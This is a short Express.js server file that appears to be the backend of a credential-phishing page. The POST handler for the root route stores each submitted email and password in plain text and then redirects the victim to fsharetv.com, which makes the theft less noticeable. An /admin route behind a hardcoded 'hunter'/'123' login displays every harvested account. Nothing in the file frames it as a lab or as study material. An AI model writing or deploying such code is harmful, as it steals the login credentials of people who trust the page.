const express = require("express");
const app = express();
const path = require("path");
const port = 3000;

let users = [];
let index = 0;

app.use(express.static(path.join(__dirname, "assets")));
app.use(express.urlencoded({ extended: true }));
app.set("view engine", "ejs");

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "./login.html"));
});

app.post("/", (req, res) => {
  let email = req.body.user_email;
  let pass = req.body.pwd;
  users[index] = { email: email, password: pass };
  // console.log(users);
  index++;
  res.redirect("https://fsharetv.com/");
});

app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "./admin-login.html"));
});
app.post("/admin", (req, res) => {
  const adminUser = "hunter";
  const adminPass = "123";

  const username = req.body.username;
  const password = req.body.password;
  if (adminUser === username && adminPass === password) {
    res.render("accs", {
      acc: users,
    });
  } else {
    res.send("wrong password");
  }
});

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
